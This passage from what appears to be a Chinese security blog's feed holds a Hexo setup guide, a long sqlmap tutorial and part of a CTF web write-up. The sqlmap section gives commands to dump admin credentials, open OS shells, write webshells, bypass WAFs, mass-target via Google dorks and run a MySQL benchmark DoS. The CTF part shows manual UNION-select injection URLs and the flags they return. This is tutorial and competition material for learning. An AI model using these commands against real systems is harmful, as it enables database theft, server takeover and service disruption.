( comment, name ) VALUES ( :message, :name );&#39; ); $data-&gt;bindParam( &#39;:message&#39;, $message, PDO::PARAM_STR ); $data-&gt;bindParam( &#39;:name&#39;, $name, PDO::PARAM_STR ); $data-&gt;execute(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><p>使用htmlspecialchars函数，解决了XSS</p></、>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Dvwa </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hexo博客搭建</title>
      <link href="/archives/undefined/"/>
      <url>/archives/undefined/</url>
      
        <content type="html"><![CDATA[<p>#hexo博客搭建</p><p>##安装git,nodejs,npm，并了解相关基础知识<br>下载nodejs和git(<a href="https://git-scm.com/)并安装" target="_blank" rel="external">https://git-scm.com/)并安装</a></p><p>确认安装成功</p><h2 id="建立github仓库"><a href="#建立github仓库" class="headerlink" title="建立github仓库"></a>建立github仓库</h2><p>新建一个名为你的用户名.github.io的仓库，比如说，如果你的github用户名是test，那么你就新建test.github.io的仓库（必须是你的用户名，其它名称无效），将来你的网站访问地址就是 <a href="http://test.github.io" target="_blank" rel="external">http://test.github.io</a> 了，是不是很方便？</p><p>由此可见，每一个github账户最多只能创建一个这样可以直接使用域名访问的仓库。</p><p>几个注意的地方：</p><blockquote><p>注册的邮箱一定要验证，否则不会成功；<br>仓库名字必须是：username.github.io，其中username是你的用户名；<br>仓库创建成功不会立即生效，需要过一段时间，大概10-30分钟，或者更久，我的等了半个小时才生效；<br>创建成功后，默认会在你这个仓库里生成一些示例页面，以后你的网站所有代码都是放在这个仓库里啦。</p></blockquote><h2 id="本地安装Git"><a href="#本地安装Git" class="headerlink" title="本地安装Git"></a>本地安装Git</h2><p>进入 Git 官网，下载相应的 Git 版本，下载完成之后按照引导安装 Git 。安装完成之后在开始菜单中会有一个 Git Bash 。这是一个类似于Liunx的终端，在里面可以模拟Linux下的终端进行操作。</p><h2 id="配置SSH"><a href="#配置SSH" class="headerlink" title="配置SSH"></a>配置SSH</h2><p>打开 Git Bash ，执行下面的命令生成 SSH 访问私钥及公钥。</p><p>$ ssh-keygen -t rsa -C “email@email.com”<br>ssh | 300*0<br>输入命令回车之后会提示你输入一些东西，不用管。一直回车到底就好了。然后你的 ~/.ssh 文件下就会生成两个文件 id_rsa 和 id_rsa.pub 。</p><p>打开你的 Github -&gt; setting -&gt; SSH Keys 。然后点击 New SSH Key 创建一个新的SSH Key。Title 可以用你的计算机名，可以用以区分。将文件 id_rsa.pub 中的所以内容复制粘贴到 Key 下面。然后使用下面的命令测试是否可以连接上 Github 。</p><p>$ ssh -T git@github.com<br><img src="http://oy0tigw51.bkt.clouddn.com/201711210154_534.png" alt=""></p><h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>Hexo的安装在其官方文档中有很详细的说明。下面将简单介绍Hexo的安装。</p><h4 id="安装前提"><a href="#安装前提" class="headerlink" title="安装前提"></a>安装前提</h4><p>安装 Node.js ，请进入Node.js 的官网下载安装。<br>安装 Git ，前面已经说明，不再赘述。</p><h4 id="安装Hexo-1"><a href="#安装Hexo-1" class="headerlink" title="安装Hexo"></a>安装Hexo</h4><p>上面两个工具安装完整之后，打开 Git Bash ，只需要使用npm即可完成Hexo的安装。</p><p>$ npm install -g hexo-cli<br>安装Hexo完成之后，执行下面的命令，Hexo将会在你制定的文件夹中新建所需要的文件。</p><p>$ hexo init <folder><br>$ cd <folder><br>$ npm install<br>新建完成后，文件夹下的目录如下：</folder></folder></p><p>.<br>├── _config.yml<br>├── package.json<br>├── scaffolds<br>├── source<br>|   ├── _drafts<br>|   └── _posts<br>└── themes<br>_config.yml 文件是网站的配置文件，可以在其中配置网站的大部分参数。<br>package.json 文件是应用程序的信息。<br>source 是资源文件夹，是用来存放用户资源的地方。<br>themes 是主题文件夹，Hexo会根据主题来生成不同的静态页面。<br>scaffolds是模板件夹，当新建文章的时候，Hexo会根据模板来建立文件。</p><h2 id="修改主题"><a href="#修改主题" class="headerlink" title="修改主题"></a>修改主题</h2><p><a href="https://github.com/yelog/hexo-theme-3-hexo首先下载这个主题：" target="_blank" rel="external">https://github.com/yelog/hexo-theme-3-hexo首先下载这个主题：</a></p><pre><code>$ cd /f/Workspaces/hexo/$ git clone https://github.com/yelog/hexo-theme-3-hexo themes/3-hexo</code></pre><p>修改_config.yml中的theme: landscape改为theme: 3-hexo，然后重新执行hexo g来重新生成。</p><p>如果出现一些莫名其妙的问题，可以先执行hexo clean来清理一下public的内容，然后再来重新生成和发布。</p><h2 id="上传之前"><a href="#上传之前" class="headerlink" title="上传之前"></a>上传之前</h2><p>在上传代码到github之前，一定要记得先把你以前所有代码下载下来（虽然github有版本管理，但备份一下总是好的），因为从hexo提交代码时会把你以前的所有代码都删掉。</p><h2 id="上传到github"><a href="#上传到github" class="headerlink" title="上传到github"></a>上传到github</h2><p>如果你一切都配置好了，发布上传很容易，一句hexo d就搞定，当然关键还是你要把所有东西配置好。</p><p>首先，ssh key肯定要配置好。</p><p>其次，配置_config.yml中有关deploy的部分：</p><p>正确写法：</p><p>deploy:<br>  type: git<br>  repository: git@github.com:liuxianan/liuxianan.github.io.git<br>  branch: master</p><p>错误写法：</p><p>deploy:<br>  type: github<br>  repository: <a href="https://github.com/liuxianan/liuxianan.github.io.git" target="_blank" rel="external">https://github.com/liuxianan/liuxianan.github.io.git</a><br>  branch: master</p><h2 id="总结：部署步骤"><a href="#总结：部署步骤" class="headerlink" title="总结：部署步骤"></a>总结：部署步骤</h2><p>每次部署的步骤，可按以下三步来进行。</p><p>hexo clean<br>hexo generate<br>hexo deploy</p><ol><li><p>总结：本地调试</p></li><li><p>在执行下面的命令后，</p></li></ol><p>$ hexo g #生成<br>$ hexo s #启动本地服务，进行文章预览调试<br>浏览器输入<a href="http://localhost:4000，查看搭建效果。此后的每次变更_config.yml" target="_blank" rel="external">http://localhost:4000，查看搭建效果。此后的每次变更_config.yml</a> 文件或者新建文件都可以先用此命令调试，尤其是当你想调试新添加的主题时。</p><ol><li>可以用简化的一条命令</li></ol><p>hexo s -g</p><h2 id="常用hexo命令"><a href="#常用hexo命令" class="headerlink" title="常用hexo命令"></a>常用hexo命令</h2><p>hexo clean 清除<br>hexo s -g #生成并本地预览<br>hexo d -g #生成并上传<br>hexo server –debug  # 本地部署<br>hexo generate or hexo g  # 生成页面<br>hexo deployer or hexo d  # 部署到github<br>hexo new “title”  # 新建文章<br>hexo new page “about”  # 创建新页面</p><h2 id="3-Hexo主题的分类和标签设置："><a href="#3-Hexo主题的分类和标签设置：" class="headerlink" title="3-Hexo主题的分类和标签设置："></a>3-Hexo主题的分类和标签设置：</h2><p>这里遇到了坑<br>发了邮件问了这个主题的开发者<br>我以为是要用next主题形式创建hexo new page “ca”</p><pre><code>代码：tags: - 前端- hexocategories: - 前端在博客根目录输入hexo new page tags打开 tags/index.md ，并改成：title: 标签date: 日期type: &quot;tags&quot;comments: false分类同理hexo new page categories打开category/index.md，改为：title: 分类date: 日期type: &quot;categories&quot;comments: false</code></pre><p>实际上不需要 ，大概浪费了我两天时间的坑。<br>这个侧边栏分类无须单独配置，只要在文章中加入 categories</p><p>比如创建了一篇文章如下，加入 categories: 大前端， 这样就会在侧边栏自动出现 大前端 这个分类，且所有有 categories: 大前端 这个参数的文章都会归到这个分类下。<br>这个主题贼强 自动添加文集分类</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201711221651_585.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201711221651_329.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 思考 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SQLMAP注入教程-11种常见SQLMAP使用方法详解</title>
      <link href="/archives/18bbc00d/"/>
      <url>/archives/18bbc00d/</url>
      
        <content type="html"><![CDATA[<h1 id="SQLMAP注入教程-11种常见SQLMAP使用方法详解"><a href="#SQLMAP注入教程-11种常见SQLMAP使用方法详解" class="headerlink" title="SQLMAP注入教程-11种常见SQLMAP使用方法详解"></a>SQLMAP注入教程-11种常见SQLMAP使用方法详解</h1><pre><code>sqlmap也是渗透中常用的一个注入工具，其实在注入工具方面，一个sqlmap就足够用了，只要你用的熟，秒杀各种工具，只是一个便捷性问题，sql注入另一方面就是手工党了，这个就另当别论了。今天把我一直以来整理的sqlmap笔记发布上来供大家参考。</code></pre><p>一共有11种常见SQLmap使用方法：</p><p>一、SQLMAP用于Access数据库注入</p><p>(1) 猜解是否能注入<br>win: python sqlmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“<br>Linux : .lmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“</p><p>(2) 猜解表<br>win: python sqlmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“ –tables<br>Linux: .lmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“ –tables</p><p>(3) 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)<br>win: python sqlmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“ –columns -T admin<br>Linux: .lmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“ –columns -T admin</p><p>(4) 根据字段猜解内容(假如通过3得到字段为username和password)<br>win: python sqlmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“ –dump -T admin -C “username,password”<br>Linux: .lmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“ –dump -T admin -C<br>“username,[url=]B[/url]password”</p><p>二、SQLMAP用于Cookie注入</p><p>(1) cookie注入，猜解表<br>win : python sqlmap.py -u “<a href="http://www.xxx.org/jsj/shownews.asp" target="_blank" rel="external">http://www.xxx.org/jsj/shownews.asp</a>“ –cookie “id=31” –table –level 2</p><p>(2) 猜解字段，(通过1的表猜解字段，假如表为admin)<br>win :python sqlmap.py -u “<a href="http://www.xxx.org/jsj/shownews.asp" target="_blank" rel="external">http://www.xxx.org/jsj/shownews.asp</a>“ –cookie “id=31” –columns -T<br>admin –level 2</p><p>(3) 猜解内容<br>win :python sqlmap.py -u “<a href="http://www.xxx.org/jsj/shownews.asp" target="_blank" rel="external">http://www.xxx.org/jsj/shownews.asp</a>“ –cookie “id=31” –dump -T<br>admin -C “username,password” –level 2</p><p>三、SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell</p><p>win:<br>python sqlmap.py -u [url]<a href="http://192.168.159.1/news.php?id=1[/url" target="_blank" rel="external">http://192.168.159.1/news.php?id=1[/url</a>] –sql-shell<br>Linux:<br>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url" target="_blank" rel="external">http://192.168.159.1/news.php?id=1[/url</a>] –sql-shell</p><p>(2) 输入执行语句完成DDOS攻击<br>select benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f)</p><h2 id="四、SQLMAP用于mysql注入"><a href="#四、SQLMAP用于mysql注入" class="headerlink" title="四、SQLMAP用于mysql注入"></a>四、SQLMAP用于mysql注入</h2><p>(1) 查找数据库<br>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321" target="_blank" rel="external">http://www.xxx.com/link.php?id=321</a>“ –dbs</p><p>(2) 通过第一步的数据库查找表(假如数据库名为dataname)<br>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321" target="_blank" rel="external">http://www.xxx.com/link.php?id=321</a>“ -D dataname –tables</p><p>(3) 通过2中的表得出列名(假如表为table_name)<br>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321" target="_blank" rel="external">http://www.xxx.com/link.php?id=321</a>“ -D dataname -T table_name –columns</p><p>(4) 获取字段的值(假如扫描出id,user,password字段)<br>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321" target="_blank" rel="external">http://www.xxx.com/link.php?id=321</a>“ -D dataname -T table_name -C<br>“id,user,password” –dump</p><h3 id="五、SQLMAP中post登陆框注入"><a href="#五、SQLMAP中post登陆框注入" class="headerlink" title="五、SQLMAP中post登陆框注入"></a>五、SQLMAP中post登陆框注入</h3><p>(1) 其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件</p><pre><code>我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。</code></pre><ol><li>浏览器打开目标地址http:// www.xxx.com /Login.asp</li></ol><ol><li>配置burp代理(127.0.0.1:8080)以拦截请求</li></ol><ol><li>点击login表单的submit按钮</li></ol><ol><li>这时候Burp会拦截到了我们的登录POST请求</li></ol><ol><li>把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</li></ol><ol><li>运行sqlmap并使用如下命令：<br>./sqlmap.py -r search-test.txt -p tfUPass</li></ol><p>这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。<br>注入点：<a href="http://testasp.vulnweb.com/Login.asp" target="_blank" rel="external">http://testasp.vulnweb.com/Login.asp</a></p><p>几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass</p><p>(2) 自动的搜索<br>sqlmap -u [url]<a href="http://testasp.vulnweb.com/Login.asp[/url" target="_blank" rel="external">http://testasp.vulnweb.com/Login.asp[/url</a>] –forms</p><p>(3) 指定参数搜索<br>sqlmap -u [url]<a href="http://testasp.vulnweb.com/Login.asp[/url" target="_blank" rel="external">http://testasp.vulnweb.com/Login.asp[/url</a>] –data “tfUName=321&amp;tfUPass=321”</p><p>六、SQLMAP中Google搜索注入</p><p>inurl后面的语言是由自己定的</p><p>注入过程中如果选y是注入，如果不是选n</p><p>sqlmap -g inurl:php?id=</p><p>七、SQLMAP中的请求延迟</p><p>参数 –delay –safe-freq</p><p>python sqlmap.py –dbs -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://xxx.cn/index.php/Index/view/id/40.html</a>“ –delay 1<br>python sqlmap.py –dbs -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://xxx.cn/index.php/Index/view/id/40.html</a>“ –safe-freq 3</p><p>参数</p><p>八、SQLMAP绕过WAF防火墙<br>注入点:<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="external">http://192.168.159.1/news.php?id=1</a><br>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url" target="_blank" rel="external">http://192.168.159.1/news.php?id=1[/url</a>] -v 3 –dbs –batch –tamper “space2morehash.py”</p><p>space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py</p><p>都是编码方式</p><p>space2hash.py base64encode.py charencode.py</p><p>九、SQLMAP查看权限<br>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url" target="_blank" rel="external">http://192.168.159.1/news.php?id=1[/url</a>] –privileges</p><p>十、SQLMAP伪静态注入<br>(1) 查找数据库<br>python sqlmap.py -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://xxx.cn/index.php/Index/view/id/40.html</a>“ –dbs</p><p>(2) 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)<br>python sqlmap.py -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://xxx.cn/index.php/Index/view/id/40.html</a>“ -D dataname –tables</p><p>(3) 通过2中的数据表得到字段(假如得到的是tablename表)<br>python sqlmap.py -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://xxx.cn/index.php/Index/view/id/40.html</a>“ -D dataname -T<br>tablename –columns</p><p>(4) 通过3得到字段值(假如从3中得到字段id，password)<br>python sqlmap.py -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://xxx.cn/index.php/Index/view/id/40.html</a>“ -D dataname -T<br>tablename -C “password” –dump</p><p>十一、SQLMAP注入点执行命令与交互写shell<br>(1) 注入点：<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="external">http://192.168.159.1/news.php?id=1</a></p><p>此处采用的是Linux系统<br>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url" target="_blank" rel="external">http://192.168.159.1/news.php?id=1[/url</a>] –os-cmd=ipconfig</p><p>出现语言的选择根据实际的测试网站选择语言</p><p>指定目标站点D:/www/ </p><p>(2) 获取Shell<br>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url" target="_blank" rel="external">http://192.168.159.1/news.php?id=1[/url</a>] –os-shell</p><p>指定目标站点D:/www/</p><p>输入ipconfig/all</p><p>创建用户和删除用户</p><p>只要权限足够大，你可以输入使用任何命令。</p><p>其他命令参考下面：</p><p>从数据库中搜索字段</p><p>1</p><p>sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password</p><p>在dedecms数据库中搜索字段admin或者password。</p><p>读取与写入文件</p><p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p><p>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）</p><p>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p><p>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</p><p>#示例：</p><p>1</p><p>sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”</p><p>使用shell命令：</p><p>1</p><p>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell</p><p>接下来指定网站可写目录：</p><p>“E:\php\htdocs\dvwa”</p><p>注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</p><p>sqlmap详细命令：</p><pre><code>-is-dba 当前用户权限（是否为root权限）-dbs 所有数据库-current-db 网站当前数据库-users 所有数据库用户-current-user 当前数据库用户-random-agent 构造随机user-agent-passwords 数据库密码-proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理-time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</code></pre><p>Options（选项）：</p><pre><code>-version 显示程序的版本号并退出-h, –help 显示此帮助消息并退出-v VERBOSE 详细级别：0-6（默认为1）</code></pre><p>Target（目标）：</p><p>以下至少需要设置其中一个选项，设置目标URL。</p><pre><code>-d DIRECT 直接连接到数据库。-u URL, –url=URL 目标URL。-l LIST 从Burp或WebScarab代理的日志中解析目标。-r REQUESTFILE 从一个文件中载入HTTP请求。-g GOOGLEDORK 处理Google dork的结果作为目标URL。-c CONFIGFILE 从INI配置文件中加载选项。</code></pre><p>Request（请求）：</p><p>这些选项可以用来指定如何连接到目标URL。</p><pre><code>-data=DATA 通过POST发送的数据字符串-cookie=COOKIE HTTP Cookie头-cookie-urlencode URL 编码生成的cookie注入-drop-set-cookie 忽略响应的Set – Cookie头信息-user-agent=AGENT 指定 HTTP User – Agent头-random-agent 使用随机选定的HTTP User – Agent头-referer=REFERER 指定 HTTP Referer头-headers=HEADERS 换行分开，加入其他的HTTP头-auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)-auth-cred=ACRED HTTP身份验证凭据（用户名:密码）-auth-cert=ACERT HTTP认证证书（key_file，cert_file）-proxy=PROXY 使用HTTP代理连接到目标URL-proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）-ignore-proxy 忽略系统默认的HTTP代理-delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒-timeout=TIMEOUT 等待连接超时的时间（默认为30秒）-retries=RETRIES 连接超时后重新连接的时间（默认3）-scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式-safe-url=SAFURL 在测试过程中经常访问的url地址-safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL</code></pre><p>Enumeration（枚举）：</p><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。</p><pre><code>-b, –banner 检索数据库管理系统的标识-current-user 检索数据库管理系统当前用户-current-db 检索数据库管理系统当前数据库-is-dba 检测DBMS当前用户是否DBA-users 枚举数据库管理系统用户-passwords 枚举数据库管理系统用户密码哈希-privileges 枚举数据库管理系统用户的权限-roles 枚举数据库管理系统用户的角色-dbs 枚举数据库管理系统数据库-D DBname 要进行枚举的指定数据库名-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）-tables 枚举的DBMS数据库中的表-columns 枚举DBMS数据库表列-dump 转储数据库管理系统的数据库中的表项-dump-all 转储所有的DBMS数据库表中的条目-search 搜索列（S），表（S）和/或数据库名称（S）-C COL 要进行枚举的数据库列-U USER 用来进行枚举的数据库用户-exclude-sysdbs 枚举表时排除系统数据库-start=LIMITSTART 第一个查询输出进入检索-stop=LIMITSTOP 最后查询的输出进入检索-first=FIRSTCHAR 第一个查询输出字的字符检索-last=LASTCHAR 最后查询的输出字字符检索-sql-query=QUERY 要执行的SQL语句-sql-shell 提示交互式SQL的shell</code></pre><p>Optimization（优化）：</p><p>这些选项可用于优化SqlMap的性能。</p><pre><code>-o 开启所有优化开关–predict-output 预测常见的查询输出–keep-alive 使用持久的HTTP（S）连接–null-connection 从没有实际的HTTP响应体中检索页面长度–threads=THREADS 最大的HTTP（S）请求并发量（默认为1）</code></pre><p>Injection（注入）：</p><p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p><pre><code>-p TESTPARAMETER 可测试的参数（S）–dbms=DBMS 强制后端的DBMS为此值–os=OS 强制后端的DBMS操作系统为这个值–prefix=PREFIX 注入payload字符串前缀–suffix=SUFFIX 注入payload字符串后缀–tamper=TAMPER 使用给定的脚本（S）篡改注入数据</code></pre><p>Detection（检测）：</p><p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p><pre><code>–level=LEVEL 执行测试的等级（1-5，默认为1）–risk=RISK 执行测试的风险（0-3，默认为1）–string=STRING 查询时有效时在页面匹配字符串–regexp=REGEXP 查询时有效时在页面匹配正则表达式–text-only 仅基于在文本内容比较网页</code></pre><p>Techniques（技巧）：</p><p>这些选项可用于调整具体的SQL注入测试。</p><pre><code>–technique=TECH SQL注入技术测试（默认BEUST）–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）–union-cols=UCOLS 定列范围用于测试UNION查询注入–union-char=UCHAR 用于暴力猜解列数的字符</code></pre><p>Fingerprint（指纹）：</p><pre><code>-f, –fingerprint 执行检查广泛的DBMS版本指纹</code></pre><p>Brute force（蛮力）：</p><p>这些选项可以被用来运行蛮力检查。</p><pre><code>–common-tables 检查存在共同表–common-columns 检查存在共同列</code></pre><p>User-defined function injection（用户自定义函数注入）：</p><p>这些选项可以用来创建用户自定义函数。</p><p>–udf-inject 注入用户自定义函数</p><p>–shared-lib=SHLIB 共享库的本地路径</p><p>File system access（访问文件系统）：</p><p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p><pre><code>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</code></pre><p>Operating system access（操作系统访问）：</p><p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p><pre><code>–os-cmd=OSCMD 执行操作系统命令–os-shell 交互式的操作系统的shell–os-pwn 获取一个OOB shell，meterpreter或VNC–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC–os-bof 存储过程缓冲区溢出利用–priv-esc 数据库进程用户权限提升–msf-path=MSFPATH Metasploit Framework本地的安装路径–tmp-path=TMPPATH 远程临时文件目录的绝对路径</code></pre><p>Windows注册表访问：</p><p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p><pre><code>–reg-read 读一个Windows注册表项值–reg-add 写一个Windows注册表项值数据–reg-del 删除Windows注册表键值–reg-key=REGKEY Windows注册表键–reg-value=REGVAL Windows注册表项值–reg-data=REGDATA Windows注册表键值数据–reg-type=REGTYPE Windows注册表项值类型这些选项可以用来设置一些一般的工作参数。-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中-s SESSIONFILE 保存和恢复检索会话文件的所有数据–flush-session 刷新当前目标的会话文件–fresh-queries 忽略在会话文件中存储的查询结果–eta 显示每个输出的预计到达时间–update 更新SqlMap–save file保存选项到INI配置文件–batch 从不询问用户输入，使用所有默认配置。</code></pre><p>Miscellaneous（杂项）：</p><pre><code>–beep 发现SQL注入时提醒–check-payload IDS对注入payloads的检测测试–cleanup SqlMap具体的UDF和表清理DBMS–forms 对目标URL的解析和测试形式–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果–page-rank Google dork结果显示网页排名（PR）–parse-errors 从响应页面解析数据库管理系统的错误消息–replicate 复制转储的数据到一个sqlite3数据库–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址–wizard 给初级用户的简单向导界面</code></pre>]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>第八届Geek部分web</title>
      <link href="/archives/83955867/"/>
      <url>/archives/83955867/</url>
      
        <content type="html"><![CDATA[<h1 id="第八届Geek部分web"><a href="#第八届Geek部分web" class="headerlink" title="第八届Geek部分web"></a>第八届Geek部分web</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="故道白云"><a href="#故道白云" class="headerlink" title="故道白云"></a>故道白云</h3><h4 id="方法一sqlmap："><a href="#方法一sqlmap：" class="headerlink" title="方法一sqlmap："></a>方法一sqlmap：</h4><p>sqlmap -u “<a href="http://game.sycsec.com:2006/?id=1&amp;submit=submit" target="_blank" rel="external">http://game.sycsec.com:2006/?id=1&amp;submit=submit</a>“ –dbs<br>查找表<br>sqlmap -u “<a href="http://game.sycsec.com:2006/?id=1&amp;submit=submit" target="_blank" rel="external">http://game.sycsec.com:2006/?id=1&amp;submit=submit</a>“ -D f1ag –tables<br>通过2中的表得出列名<br>sqlmap -u “<a href="http://game.sycsec.com:2006/?id=1&amp;submit=submit" target="_blank" rel="external">http://game.sycsec.com:2006/?id=1&amp;submit=submit</a>“ -D f1ag -T flag –columns<br>获取字段的值<br>sqlmap -u “<a href="http://game.sycsec.com:2006/?id=1&amp;submit=submit" target="_blank" rel="external">http://game.sycsec.com:2006/?id=1&amp;submit=submit</a>“ -D f1ag -T flag -C “f4ag” –dump<br><img src="http://oy0tigw51.bkt.clouddn.com/201711051714_889.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201711052126_103.png" alt=""><br>SYC{HACKEr_By-cL0und}</p><h4 id="方法二手注："><a href="#方法二手注：" class="headerlink" title="方法二手注："></a>方法二手注：</h4><p>首先测试<br>这里写图片描述<br><img src="http://oy0tigw51.bkt.clouddn.com/201711222316_785.png" alt=""><br>没有过滤#号，然后应该就知道干啥了</p><pre><code>http://game.sycsec.com:2006/?submit=submit&amp;id=0&#39;union select 1,1%23http://game.sycsec.com:2006/?submit=submit&amp;id=0&#39;union select SCHEMA_NAME,1 from information_schema.SCHEMATA limit 1,1%23http://game.sycsec.com:2006/?submit=submit&amp;id=0&#39;union select TABLE_NAME,1 from information_schema.TABLES where TABLE_SCHEMA=&#39;f1ag&#39; limit 0,1%23http://game.sycsec.com:2006/?submit=submit&amp;id=0&#39;union select COLUMN_NAME,1 from information_schema.COLUMNS where TABLE_NAME=&#39;flag&#39; limit 0,1%23http://game.sycsec.com:2006/?submit=submit&amp;id=0&#39;union select f4ag,1 from f1ag.flag%23</code></pre><p>SYC{HACKEr_By-cL0und}</p><h3 id="粗心的李超"><a href="#粗心的李超" class="headerlink" title="粗心的李超"></a>粗心的李超</h3><p>通过dirb扫描后台</p><p>备份文件泄露，index.php.bak</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201711222347_913.png" alt=""><br>flag:SYC{just_brute_is_ok!}</p><h3 id="Buy-me-a-Tesla"><a href="#Buy-me-a-Tesla" class="headerlink" title="Buy me a Tesla"></a>Buy me a Tesla</h3><p>一看sign参数就有猫腻<br><img src="http://oy0tigw51.bkt.clouddn.com/201711222348_221.png" alt=""></p><p>发现就是url解密一下然后base64解密三次即可</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201711222350_33.png" alt=""></p><p>反编码<br>带入sign</p><p>SYC{KeYiGeiWoMaiYiGeZhenDeTeslaMa?}</p><h3 id="PHP的悖论1"><a href="#PHP的悖论1" class="headerlink" title="PHP的悖论1"></a>PHP的悖论1</h3><p>题目：</p><p>链接：<a href="http://game.sycsec.com:2009/10111.php" target="_blank" rel="external">http://game.sycsec.com:2009/10111.php</a><br>解题思路：</p><p>1.题目的意思很明了，要post两个变量使得if语句成立拿flag。</p><p>了解了一下==，===，！=和！==的含义，这里po出来，也算是一种复习了。</p><p>Tips：a==b： 意思是a和b的值相等，但类型不需要相同。</p><p>a===b: 